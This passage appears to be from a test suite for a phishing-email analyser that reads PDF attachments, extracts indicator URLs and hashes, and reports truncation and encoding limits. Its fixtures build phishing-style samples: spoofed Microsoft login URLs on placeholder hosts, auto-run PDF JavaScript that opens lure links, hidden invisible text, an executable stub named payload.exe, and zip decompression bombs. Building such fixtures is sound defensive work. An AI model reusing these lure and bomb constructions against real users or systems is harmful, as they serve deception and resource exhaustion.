    // Two archives inflate the whole 64 MB between them before the PDF is read.
    const zeros = await deflateRaw(new Uint8Array(8_000_000))
    const archive = zip([1, 2, 3, 4].map((n) => ({ name: `blob${n}.bin`, data: zeros, method: 8, size: 8_000_000 })))
    const lure = onePage(`BT /F1 12 Tf 72 700 Td (${LURE_TEXT}) Tj ET`)
    const report = await analysePhishing(
      mailWith(attached('a.zip', archive), attached('b.zip', archive), attached('lure.pdf', lure, 'application/pdf')),
      [],
      []
    )
    const { pdf: read } = report.attachments[2]
    expect(read?.notes.join(' ')).toContain('budget for pictures, inner files and decompressed PDF data')
    expect(read?.parsed?.pages.every((page) => !page.text && !page.hidden)).toBe(true)
    // Alone, the same file is read.
    const alone = await analysePhishing(pdfMail('lure.pdf', lure), [], [])
    expect(alone.attachments[0].pdf?.parsed?.pages[0].text).toBe(LURE_TEXT)
  })

  it('copies at most 150,000 characters of attachment text into the report, and says how much it left out', async () => {
    // Three files of three full pages each: 9 × 19,999 characters once each page's trailing space is trimmed.
    const page = 'word '.repeat(4000)
    const files = [1, 2, 3].map((n) => attached(`long${n}.pdf`, pagesOf(page, page, page), 'application/pdf'))
    const md = formatPhishReport(await analysePhishing(mailWith(...files), [], []))
    const section = md.slice(md.indexOf('### Attachment text'), md.indexOf('### Indicators'))
    // The cut falls inside a word, so the mark follows what is kept of it.
    const fenced = [...section.matchAll(/^(`{3,})\n([\s\S]*?)\n\1$/gm)].reduce(
      (n, m) => n + m[2].replaceAll('[…]', '').length,
      0
    )
    expect(fenced).toBe(150_000)
    expect(section).toContain(' wo[…]\n')
    // The card draws 4,000 characters of a page, so the rest is NOT "shown on
    // the analysis card", as this line used to say: it says what is.
    const rest =
      "The rest of the attachment text (29991 characters) is not copied here. The analysis card quotes each script as this report would, but draws only the first 4,000 characters of each page's text and of its invisible text, so page text past both limits is shown nowhere; the indicators this reader took from it are still listed under Indicators."
    expect(section).toContain(rest)
    // Nothing after the line that says the rest is not copied.
    expect(section.trimEnd().endsWith(rest)).toBe(true)
  })

  it('says invisible text drawn only in fonts it could not decode was not decoded, and fences none of it', async () => {
    // F2 is Identity-H with no /ToUnicode: its three glyphs are drawn invisibly, under visible Helvetica text.
    const bytes = onePage(
      'BT /F1 12 Tf 72 700 Td (Visit https://plain2.test/x now) Tj 3 Tr /F2 12 Tf 0 -20 Td <000100020003> Tj ET',
      {
        fonts: `<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >> /F2 << /Type /Font /Subtype /Type0 /BaseFont /Mystery /Encoding /Identity-H /DescendantFonts [5 0 R] >> >>`,
        extra: [
          {
            num: 5,
            body: '<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Mystery /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /DW 1000 >>'
          }
        ]
      }
    )
    const md = formatPhishReport(await analysePhishing(pdfMail('z.pdf', bytes), [], []))
    expect(md).not.toMatch(/^�+$/m)
    expect(md).toContain(
      'Page 1 of `z.pdf`, drawn so a reader does not show it (invisible text mode, zero size, or a hidden annotation); the case takes no indicators from it: 3 characters drawn in fonts this reader could not decode.'
    )
    // The three are in the invisible text, so the visible block does not claim them.
    expect(md).toContain('Page 1 of `z.pdf`, as its fonts decode it:\n\n```\nVisit https://plain2.test/x now\n```')
  })

  it('names the file before the caveat in a case note', async () => {
    // A font with neither /ToUnicode nor /Encoding is read through an assumed one.
    const bytes = onePage('BT /F3 12 Tf 72 700 Td (Visit https://assumed-lure.test/x now) Tj ET', {
      fonts: '<< /F3 << /Type /Font /Subtype /Type1 /BaseFont /CustomSans >> >>'
    })
    const mail = pdfMail('x.pdf', bytes)
    const iocs = caseIocs(await analysePhishing(mail, [], []), mail)
    expect(iocs.find((i) => i.value === 'https://assumed-lure.test/x')?.note).toBe(
      'in the text of page 1 of x.pdf (partly read through an assumed encoding), as decoded here'
    )
    // An OCR-shaped page's invisible text says so of itself, and the visible text, which has none, does not.
    const scan = onePage(
      'q 612 0 0 792 0 0 cm /Im1 Do Q BT 3 Tr /F3 12 Tf 72 700 Td (Pay at https://ocr-assumed.test/x) Tj ET',
      {
        fonts: '<< /F3 << /Type /Font /Subtype /Type1 /BaseFont /CustomSans >> >> /XObject << /Im1 5 0 R >>',
        extra: [
          {
            num: 5,
            body: '<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 >>',
            stream: '\xff',
            flate: true
          }
        ]
      }
    )
    const ocrMail = pdfMail('scan.pdf', scan)
    const report = await analysePhishing(ocrMail, [], [])
    expect(caseIocs(report, ocrMail).find((i) => i.value === 'https://ocr-assumed.test/x')?.note).toBe(
      'in invisible text on page 1 of scan.pdf (a page that draws a picture and no visible text this reader decoded: an OCR layer, or text hidden from the reader; partly read through an assumed encoding), as decoded here'
    )
    expect(formatPhishReport(report)).toContain(
      'Page 1 of `scan.pdf`, drawn invisibly on a page that draws a picture and no visible text this reader decoded — the shape text recognition (OCR) leaves on a scanned page, and also a way to hide text from a reader; partly read through an assumed encoding:'
    )
  })

  it('takes no indicator from the word a cut falls in, which can name another host', async () => {
    const lure = 'https://login.microsoftonline.com.evil-lure.test/owa'
    // The page stops at 20,000 characters, 32 into the lure: `https://login.microsoftonline.co`.
    const page = onePage(`BT /F1 10 Tf 72 700 Td (${'a'.repeat(19_942)} https://kept-lure.test/x ${lure}) Tj ET`)
    // A field value stops at 1,000: `https://login.microsoftonlin`. A script at 1 MiB: `https://portal.office.co`.
    const form = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> /OpenAction 7 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 6, body: `<< /FT /Tx /T (to) /V (${'x'.repeat(971)} ${lure}) >>` },
      { num: 7, body: '<< /S /JavaScript /JS 8 0 R >>' },
      {
        num: 8,
        body: '<< >>',
        stream: `${' '.repeat(2 ** 20 - 24)}https://portal.office.com.evil-lure.test/x`,
        flate: true
      }
    ])
    const mail = mailWith(
      attached('statement.pdf', page, 'application/pdf'),
      attached('form.pdf', form, 'application/pdf')
    )
    const report = await analysePhishing(mail, [], [])
    const [text, fields] = report.attachments.map((a) => a.pdf?.parsed)
    expect(text?.pages[0].text.endsWith(` https://login.microsoftonline.co${GAP}`)).toBe(true)
    expect(fields?.fields[0].value.endsWith(` https://login.microsoftonlin${GAP}`)).toBe(true)
    expect(fields?.scripts[0].source.endsWith(` https://portal.office.co${GAP}`)).toBe(true)
    const iocs = caseIocs(report, mail)
    expect(iocs.filter((i) => /microsoftonlin|portal\.office/.test(i.value))).toEqual([])
    // A value that ends before the cut is still taken.
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://kept-lure.test/x',
      note: 'in the text of page 1 of statement.pdf, as decoded here'
    })
    expect(report.attachments.map((a) => a.pdf?.notes.filter((n) => n.includes(' word(s) next to ')))).toEqual([
      [gapNote(1)],
      [gapNote(2)]
    ])
    // Quoted as read, with the mark where the cut is.
    const md = formatPhishReport(report)
    expect(md).toContain(' https://login.microsoftonline.co[…]\n')
    expect(md).toContain(' https://login.microsoftonlin[…]`')
    expect(md).not.toContain(GAP)
  })

  it('says a picture dropped by the message budget is not shown, not that it was not extracted', async () => {
    // The archives leave 1,000 bytes: the page is read, its 5,000-byte picture is extracted and not kept.
    const zeros = await deflateRaw(new Uint8Array(8_000_000))
    const blob = (n: number, data = zeros, size = 8_000_000) => ({ name: `blob${n}.bin`, data, method: 8, size })
    const a = zip([1, 2, 3, 4].map((n) => blob(n)))
    const b = zip([blob(1), blob(2), blob(3), blob(4, await deflateRaw(new Uint8Array(7_999_000)), 7_999_000)])
    const jpeg = new Uint8Array(5_000)
    jpeg.set([0xff, 0xd8, 0xff, 0xe0])
    jpeg.set([0xff, 0xd9], 4_998)
    const qr = onePage('q 100 0 0 100 0 0 cm /Im1 Do Q', {
      fonts: `${HELVETICA} /XObject << /Im1 5 0 R >>`,
      extra: [
        { num: 5, body: '<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /Filter /DCTDecode >>', stream: jpeg }
      ]
    })
    const report = await analysePhishing(
      mailWith(attached('a.zip', a), attached('b.zip', b), attached('qr.pdf', qr, 'application/pdf')),
      [],
      []
    )
    const lines = structureLines(report.attachments[2])
    expect(lines).toContain(
      '  - PDF pictures drawn on page 1: `/DCTDecode` 1×1 (object 5), stored `/DCTDecode`: not shown here'
    )
    expect(lines.join('\n')).toContain('1 image stream was extracted and not kept')
  })

  it('keeps an action with 2,000 /AA events to one short line', async () => {
    // Every key is an event of its own, and they all run one script.
    const key = (i: number): string =>
      String.fromCharCode(65 + (i % 26), 65 + (((i / 26) % 26) | 0), (65 + i / 676) | 0, 65)
    const bytes = buildPdf([
      {
        num: 1,
        body: `<< /Type /Catalog /Pages 2 0 R /AA << ${Array.from({ length: 2000 }, (_, i) => `/${key(i)} 5 0 R`).join(' ')} >> >>`
      },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 5, body: '<< /S /JavaScript /JS (app.alert\\(1\\)) >>' }
    ])
    const lines = structureLines((await analysePhishing(pdfMail('aa.pdf', bytes), [], [])).attachments[0])
    const action = lines.filter((l) => l.startsWith('  - PDF action '))
    expect(action).toHaveLength(1)
    // Joined whole it was 54,038 characters.
    expect(action[0].length).toBeLessThan(4_096)
    expect(action[0]).toMatch(/ and 1992 more trigger\(s\) \(object 5\)$/)
  })

  it('says a name in an encrypted file was not read, not that there is none', async () => {
    const bytes = buildPdf(
      [
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> >>' },
        { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
        { num: 6, body: '<< /FT /Tx /T (password) /V (hunter2) >>' },
        // The stream proves itself cleartext by its zlib checksum; the names are strings, so ciphertext.
        { num: 8, body: '<< /Type /Filespec /UF (payload.exe) /EF << /F 9 0 R >> >>' },
        { num: 9, body: '<< /Type /EmbeddedFile >>', stream: 'MZxxxx', flate: true },
        { num: 30, body: '<< /Filter /Standard /V 2 /R 3 >>' }
      ],
      { trailer: '/Encrypt 30 0 R' }
    )
    const mail = pdfMail('locked.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    const unread = '(no name read: this file is encrypted, and a name stored encrypted is not read)'
    const lines = structureLines(report.attachments[0])
    expect(lines.find((l) => l.startsWith('  - PDF embedded file '))).toMatch(
      `  - PDF embedded file ${unread}: size not declared; bytes begin as Windows executable (MZ); SHA-256 `
    )
    expect(lines).toContain(
      `  - PDF form field ${unread} (\`/Tx\`): no value listed (this file is encrypted, and a value stored encrypted is not read)`
    )
    expect(caseIocs(report, mail).find((i) => i.type === 'hash' && i.note?.includes('inside locked.pdf'))?.note).toBe(
      `${unread} inside locked.pdf (hashed here)`
    )
  })

  it('keeps a whole visible link when only the invisible text on its page was cut', async () => {
    // A word of 25,000 characters drawn invisibly is cut at 20,000; the visible line is read whole.
    const bytes = onePage(
      `BT /F1 12 Tf 72 700 Td (Pay your invoice at https://evil-lure.test/pay) Tj 3 Tr 0 -20 Td (${'z'.repeat(25_000)}) Tj ET`
    )
    const mail = pdfMail('inv.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    const page = report.attachments[0].pdf?.parsed?.pages[0]
    expect([page?.text.includes(GAP), page?.hidden.endsWith(GAP)]).toEqual([false, true])
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'url',
      value: 'https://evil-lure.test/pay',
      note: 'in the text of page 1 of inv.pdf, as decoded here'
    })
    expect(report.attachments[0].pdf?.notes.join(' ')).not.toContain(' word(s) next to ')
  })

  it('counts the U+FFFD a page holds, and names no cause the decoder did not count', async () => {
    // F2's /ToUnicode maps A, B and C to U+FFFD: nothing goes undecoded, and the text is still three of them.
    const fonts =
      '<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >> /F2 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding /ToUnicode 5 0 R >> >>'
    const extra = [
      {
        num: 5,
        body: '<< >>',
        stream:
          'begincmap 1 begincodespacerange <00> <FF> endcodespacerange 3 beginbfchar <41> <FFFD> <42> <FFFD> <43> <FFFD> endbfchar endcmap'
      }
    ]
    const visible = onePage('BT /F2 12 Tf 72 700 Td (ABC) Tj ET', { fonts, extra })
    const hidden = onePage(
      'BT /F1 12 Tf 72 700 Td (Visit https://plain2.test/x now) Tj 3 Tr /F2 12 Tf 0 -20 Td (ABC) Tj ET',
      {
        fonts,
        extra
      }
    )
    const report = await analysePhishing(
      mailWith(attached('v.pdf', visible, 'application/pdf'), attached('h.pdf', hidden, 'application/pdf')),
      [],
      []
    )
    expect(report.attachments.map((a) => a.pdf?.parsed?.pages[0])).toMatchObject([
      { text: '���', undecoded: 0 },
      { hidden: '���', hiddenUndecoded: 0 }
    ])
    const md = formatPhishReport(report)
    expect(md).toContain('Page 1 of `v.pdf`: its text holds only 3 replacement characters (U+FFFD).')
    expect(md).toContain(
      'Page 1 of `h.pdf`, drawn so a reader does not show it (invisible text mode, zero size, or a hidden annotation); the case takes no indicators from it: its text holds only 3 replacement characters (U+FFFD).'
    )
    expect(md).not.toMatch(/\b0 characters drawn/)
  })

  it('takes the last link of a form field value of exactly 1,000 characters, which is whole', async () => {
    const value = `${'x'.repeat(1000 - ' https://whole-field.test/x'.length)} https://whole-field.test/x`
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 6, body: `<< /FT /Tx /T (to) /V (${value}) >>` }
    ])
    const mail = pdfMail('form.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments[0].pdf?.parsed?.fields[0]).toEqual({ name: 'to', value, type: '/Tx', password: false })
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'url',
      value: 'https://whole-field.test/x',
      note: 'in a form field of form.pdf, as decoded here'
    })
    expect(report.attachments[0].pdf?.notes.join(' ')).not.toContain(' word(s) next to ')
  })

  it('says a signature field’s /V was not listed, not that the field has no value', async () => {
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R 7 0 R] >> >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 6, body: '<< /FT /Sig /T (Signature1) /V 9 0 R >>' },
      { num: 7, body: '<< /FT /Tx /T (Empty) >>' },
      { num: 9, body: '<< /Type /Sig /Filter /Adobe.PPKLite /Name (Mallory) >>' }
    ])
    const lines = structureLines((await analysePhishing(pdfMail('signed.pdf', bytes), [], [])).attachments[0])
    expect(lines.filter((l) => l.startsWith('  - PDF form field '))).toEqual([
      "  - PDF form field `Signature1` (`/Sig`): a /V value this reader does not list (a dictionary, stream or number, an array it stopped examining before it listed anything, or an object it could not read; a signature field's /V is its signature)",
      '  - PDF form field `Empty` (`/Tx`): no value set (/V)'
    ])
  })

  it('says an array /V it stopped examining before it listed anything was not listed, not unset', async () => {
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      { num: 6, body: `<< /FT /Ch /Ff 2097152 /T (pick) /V [${'() '.repeat(1001)}(https://arr-late.test/x)] >>` }
    ])
    const lines = structureLines((await analysePhishing(pdfMail('pick.pdf', bytes), [], [])).attachments[0])
    expect(lines).toContain(
      "  - PDF form field `pick` (`/Ch`): a /V value this reader does not list (a dictionary, stream or number, an array it stopped examining before it listed anything, or an object it could not read; a signature field's /V is its signature)"
    )
  })

  it('puts the links of a file that encrypts only its attachments on the case, as links', async () => {
    // Acrobat's "encrypt only file attachments": /StrF /Identity leaves every string as written.
    const bytes = buildPdf(
      [
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
        { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
        { num: 3, body: '<< /Type /Page /Parent 2 0 R /Annots [6 0 R] >>' },
        {
          num: 6,
          body: '<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://payslip-lure.test/login) >> >>'
        },
        {
          num: 30,
          body: '<< /Filter /Standard /V 4 /R 4 /CF << /StdCF << /CFM /AESV2 /AuthEvent /EFOpen >> >> /StmF /Identity /StrF /Identity /EFF /StdCF >>'
        }
      ],
      { trailer: '/Encrypt 30 0 R' }
    )
    const mail = pdfMail('payslip.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'url',
      value: 'https://payslip-lure.test/login',
      note: 'inside payslip.pdf'
    })
    const lines = structureLines(report.attachments[0])
    expect(lines).toContain('  - PDF link (/URI): `hxxps://payslip-lure[.]test/login`')
    expect(lines.join('\n')).not.toContain('stored encrypted')
  })

  it('reads a script many actions share for indicators once', async () => {
    const script = 'var u = "https://shared-js.test/a"; '.repeat(500)
    const bytes = buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
      ...Array.from({ length: 10 }, (_, i) => ({
        num: 5 + i,
        body: `<< /S /JavaScript /JS 99 0 R${i < 9 ? ` /Next ${6 + i} 0 R` : ''} >>`
      })),
      { num: 99, body: `(${script})` }
    ])
    const mail = pdfMail('shared.pdf', bytes)
    iocScan.watch = script
    iocScan.count = 0
    try {
      const report = await analysePhishing(mail, [], [])
      expect(report.attachments[0].pdf?.parsed?.scripts.map((s) => s.source)).toEqual(Array(10).fill(script))
      expect(iocScan.count).toBe(1)
      expect(caseIocs(report, mail).filter((i) => i.value === 'https://shared-js.test/a')).toHaveLength(1)
    } finally {
      iocScan.watch = ''
    }
  })

  it('stops reading a PDF’s text for indicators at the message’s time limit, and says what it left unread', async () => {
    // Packed and compressed, so the byte scan cannot find what the text read leaves.
    const bytes = buildPdf([
      objStm(10, [
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> /OpenAction 7 0 R >>' },
        { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
        { num: 3, body: `<< /Type /Page /Parent 2 0 R /Resources << /Font ${HELVETICA} >> /Contents 4 0 R >>` },
        { num: 6, body: '<< /FT /Tx /T (to) /V (https://field-late.test/b) >>' },
        { num: 7, body: '<< /S /JavaScript /JS (app.launchURL\\("https://script-late.test/c"\\);) >>' }
      ]),
      { num: 4, body: '<< >>', stream: 'BT /F1 12 Tf 72 700 Td (https://page-late.test/a) Tj ET', flate: true }
    ])
    const mail = pdfMail('late.pdf', bytes)
    // The clock jumps past the deadline while the page is scanned, so nothing waits on a real one.
    const real = performance.now.bind(performance)
    let ahead = 0
    const clock = vi.spyOn(performance, 'now').mockImplementation(() => real() + ahead)
    iocScan.onScan = (text) => {
      if (text.includes('page-late')) ahead = 3_600_000
    }
    try {
      const report = await analysePhishing(mail, [], [])
      expect(report.attachments[0].pdf?.parsed?.scripts).toHaveLength(1)
      const values = caseIocs(report, mail).map((i) => i.value)
      expect(values).toContain('https://page-late.test/a')
      expect(values.filter((v) => /field-late|script-late/.test(v))).toEqual([])
      expect(report.attachments[0].pdf?.notes).toContain(
        "Indicators were not taken from 1 form field value(s) and 1 script(s) in this PDF because this message's time limit for reading its PDFs (15 seconds) was reached; any they hold are unread, not absent."
      )
    } finally {
      clock.mockRestore()
      iocScan.onScan = null
    }
  })

  it('says a stream the message budget cut short was read in part, not that it was not read', async () => {
    // The archives leave 1,000 bytes of the message's budget: the page's one stream is read that far.
    const zeros = await deflateRaw(new Uint8Array(8_000_000))
    const blob = (n: number, data = zeros, size = 8_000_000) => ({ name: `blob${n}.bin`, data, method: 8, size })
    const a = zip([1, 2, 3, 4].map((n) => blob(n)))
    const b = zip([blob(1), blob(2), blob(3), blob(4, await deflateRaw(new Uint8Array(7_999_000)), 7_999_000)])
    const runs = Array.from({ length: 300 }, (_, i) => `(line ${i} https://lure-${i}.test/p) Tj 0 -14 Td`).join(' ')
    const lure = onePage(`BT /F1 12 Tf 72 720 Td ${runs} ET`)
    const report = await analysePhishing(
      mailWith(attached('a.zip', a), attached('b.zip', b), attached('lure.pdf', lure, 'application/pdf')),
      [],
      []
    )
    const read = report.attachments[2]
    expect(read.pdf?.parsed?.pages[0].text).toContain('https://lure-0.test/p')
    const notes = structureLines(read).filter((l) => l.startsWith('  - PDF reader: '))
    expect(notes.filter((l) => l.includes('were cut short when a decompression budget ran out'))).toHaveLength(1)
    expect(notes.join('\n')).not.toMatch(/were not decompressed|further stream\(s\) it needed were not read/)
  })
})

describe('a PDF where the reader marked a gap', () => {
  const CONTENT_CAP = 4 * 2 ** 20
  const head = 'BT /F1 12 Tf 72 700 Td (Sign in at ) Tj '
  const a = '(https://login.microsoftonline.co) Tj '
  const b = '(m.evil-split.test/owa) Tj ET\n'
  /** A one-page file drawing the content streams `contents` names, in Helvetica. */
  const page = (contents: string, extra: Obj[]): Uint8Array =>
    buildPdf([
      { num: 1, body: '<< /Type /Catalog /Pages 2 0 R >>' },
      { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
      {
        num: 3,
        body: `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font ${HELVETICA} >> /Contents ${contents} >>`
      },
      ...extra
    ])
  /** The case, the report and the gap note of a mail carrying one PDF. */
  async function read(bytes: Uint8Array) {
    const mail = pdfMail('statement.pdf', bytes)
    const report = await analysePhishing(mail, [], [])
    const pdf = report.attachments[0].pdf
    const iocs = caseIocs(report, mail)
    return {
      iocs,
      values: iocs.map((i) => i.value),
      md: formatPhishReport(report),
      text: pdf?.parsed?.pages[0]?.text,
      notes: pdf?.notes.filter((n) => n.includes(' word(s) next to ')) ?? []
    }
  }

  it('withholds a whole lure beside the end of a cut decode, and still quotes it with […]', async () => {
    // More than the 4 MiB a content stream decodes to follows the lure.
    const o = await read(
      onePage(
        `BT /F1 12 Tf 72 700 Td (Your invoice is ready) Tj 0 -20 Td (Pay at https://pad-lure.test/pay) Tj ET\n${' '.repeat(5 * 2 ** 20)}`
      )
    )
    expect(o.text).toBe(`Your invoice is ready\nPay at https://pad-lure.test/pay${GAP}`)
    expect(o.values.filter((v) => v.includes('pad-lure'))).toEqual([])
    expect(o.md).toContain('```\nYour invoice is ready\nPay at https://pad-lure.test/pay[…]\n```')
    expect(o.notes).toEqual([gapNote(1)])
    expect(o.md).not.toContain(GAP)
  })

  it('takes the lure from a stream whose /Length is wrong or missing, its end found at endstream', async () => {
    const content =
      'BT /F1 12 Tf 72 700 Td (Your invoice is ready) Tj 0 -20 Td (Pay at https://length-lure.test/pay) Tj ET'
    for (const length of [`/Length ${content.length - 7}`, '', '/Length 9 0 R']) {
      const o = await read(
        page('4 0 R', [{ num: 4, body: '', raw: `4 0 obj\n<< ${length} >>\nstream\n${content}\nendstream\nendobj\n` }])
      )
      expect(o.text).toBe('Your invoice is ready\nPay at https://length-lure.test/pay')
      expect(o.values).toContain('https://length-lure.test/pay')
      expect(o.notes).toEqual([])
    }
  })

  it('takes no word from either side of a gap, and quotes both sides with […]', async () => {
    const cut = (tail: string): string => head + ' '.repeat(CONTENT_CAP - head.length - a.length - 6) + a + tail
    const cases: [string, Uint8Array, string, number][] = [
      // The decode stops 6 bytes into the second run: at `(m.evi`.
      ['decode cut', onePage(cut(b)), 'Sign in at https://login.microsoftonline.co[…]', 1],
      [
        'decode cut, then a piece drawn straight on',
        page('[4 0 R 5 0 R]', [
          { num: 4, body: '<< >>', stream: cut('(m.evil-split.com/owa) Tj '), flate: true },
          { num: 5, body: '<< >>', stream: '(l-split.com/owa) Tj ET', flate: true }
        ]),
        'Sign in at https://login.microsoftonline.co[…]l-split.com/owa',
        2
      ],
      [
        'arrays nested too deep',
        onePage(`${head}${a}${'['.repeat(70)}${']'.repeat(70)} ${b}`),
        'Sign in at https://login.microsoftonline.co[…]',
        1
      ],
      [
        'a piece this reader cannot decode, then one it can',
        page('[4 0 R 5 0 R 6 0 R]', [
          { num: 4, body: '<< >>', stream: head + a, flate: true },
          { num: 5, body: '<< /Filter /LZWDecode >>', stream: 'x'.repeat(40) },
          { num: 6, body: '<< >>', stream: 'BT /F1 12 Tf 150 700 Td (soft.com/owa) Tj ET', flate: true }
        ]),
        // The piece between is marked on both sides of the space the next one
        // starts after: the words on both sides each touch a mark.
        'Sign in at https://login.microsoftonline.co[…] […]soft.com/owa',
        2
      ]
    ]
    for (const [name, bytes, quoted, words] of cases) {
      const o = await read(bytes)
      expect([name, o.values.filter((v) => /microsoftonline|split|soft\.com/.test(v))]).toEqual([name, []])
      expect([name, o.md.includes(`\n${quoted}\n`), o.notes]).toEqual([name, true, [gapNote(words)]])
    }
  })

  it('reads a URL whole across a form that draws nothing', async () => {
    const widths = `/FirstChar 32 /LastChar 126 /Widths [${'600 '.repeat(95)}]`
    const first = 'Sign in at https://login.microsoftonline.co'
    // The second run starts where the first ends, so a reader shows one address.
    const content = `BT /F1 12 Tf 72 700 Td (${first}) Tj ET /E Do BT /F1 12 Tf 1 0 0 1 ${72 + first.length * 7.2} 700 Tm (m.evil-split.com/owa) Tj ET`
    const o = await read(
      onePage(content, {
        fonts: `<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier /Encoding /WinAnsiEncoding ${widths} >> >> /XObject << /E 5 0 R >>`,
        extra: [{ num: 5, body: '<< /Type /XObject /Subtype /Form /BBox [0 0 1 1] >>', stream: '', flate: true }]
      })
    )
    expect(o.values).toContain('https://login.microsoftonline.com.evil-split.com/owa')
    expect(o.notes).toEqual([])
  })

  it('takes a whole URL where a field or script is cut between words, and none where one is cut inside it', async () => {
    const url = 'https://boundary-lure.test/pay'
    const scripts: Obj[] = []
    // Four scripts of just under 1 MiB, and a fifth the 4 MiB script share stops just after its URL.
    const each = 2 ** 20 - 1000
    for (let k = 0; k < 5; k++) {
      const js = k < 4 ? String(k).repeat(each) : `${'z'.repeat(4 * 2 ** 20 - 4 * each - url.length - 1)} ${url} more()`
      scripts.push(
        { num: 10 + k, body: `<< /S /JavaScript /JS ${30 + k} 0 R ${k < 4 ? `/Next ${11 + k} 0 R` : ''} >>` },
        { num: 30 + k, body: `(${js})` }
      )
    }
    const fields = (value: string): Uint8Array =>
      buildPdf([
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> /OpenAction 10 0 R >>' },
        { num: 2, body: '<< /Type /Pages /Kids [] /Count 0 >>' },
        { num: 6, body: `<< /FT /Tx /T (to) /V (${value}) >>` },
        ...scripts
      ])
    // The field's 1,000-character cap falls just after the URL: the case takes it from there.
    const between = await read(fields(`${'x'.repeat(1000 - url.length - 1)} ${url} and more words`))
    const lure = (o: typeof between) => o.iocs.filter((i) => i.value.includes('boundary-lure'))
    expect(lure(between)).toEqual([
      { type: 'url', value: url, note: 'in a form field of statement.pdf, as decoded here' }
    ])
    expect(between.notes).toEqual([])
    // Two characters earlier, the cap splits it: the case takes it from the script alone.
    const inside = await read(fields(`${'x'.repeat(1000 - url.length + 1)} ${url} and more words`))
    expect(lure(inside)).toEqual([{ type: 'url', value: url, note: 'in JavaScript inside statement.pdf' }])
    expect(inside.md).toContain(`${url.slice(0, -2)}[…]\``)
    expect(inside.notes).toEqual([gapNote(1)])
  })

  it('shows a U+E000 the file writes as U+FFFD, and leaves the word beside it in the indicators', async () => {
    const utf16 = (text: string): string =>
      `FEFF${[...text].map((c) => c.charCodeAt(0).toString(16).padStart(4, '0')).join('')}`
    // F1's /ToUnicode makes `~` U+E000.
    const o = await read(
      buildPdf([
        { num: 1, body: '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [6 0 R] >> /OpenAction 7 0 R >>' },
        { num: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
        {
          num: 3,
          body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding /ToUnicode 5 0 R >> >> >> /Contents 4 0 R >>'
        },
        {
          num: 4,
          body: '<< >>',
          stream: 'BT /F1 12 Tf 72 700 Td (Pay at https://forge-page.test/x~ now) Tj ET',
          flate: true
        },
        {
          num: 5,
          body: '<< >>',
          stream:
            'begincmap 1 begincodespacerange <00> <FF> endcodespacerange 1 beginbfchar <7E> <E000> endbfchar endcmap'
        },
        { num: 6, body: `<< /FT /Tx /T (to) /V <${utf16('https://forge-field.test/x')}> >>` },
        { num: 7, body: `<< /S /JavaScript /JS <${utf16('app.launchURL("https://forge-js.test/x");')}> >>` }
      ])
    )
    for (const url of ['https://forge-page.test/x', 'https://forge-field.test/x', 'https://forge-js.test/x']) {
      expect(o.values).toContain(url)
      expect(o.md).toContain(`${url}�`)
    }
    expect(o.notes).toEqual([])
    expect(o.md).not.toMatch(/|\[…\]/)
  })

  it('reads raw deflate whose /Length counts the end-of-line, on either engine', async () => {
    const raw = zlib('BT /F1 12 Tf 72 700 Td (Pay at https://raw-lure.test/pay) Tj ET').subarray(2, -4)
    const data = String.fromCharCode(...raw)
    for (const eol of ['\n', '\r\n']) {
      const bytes = page('4 0 R', [
        {
          num: 4,
          body: '',
          raw: `4 0 obj\n<< /Length ${raw.length + eol.length} /Filter /FlateDecode >>\nstream\n${data}${eol}endstream\nendobj\n`
        }
      ])
      for (const chromium of [false, true]) {
        const { value: o } = await inflating(() => read(bytes), chromium)
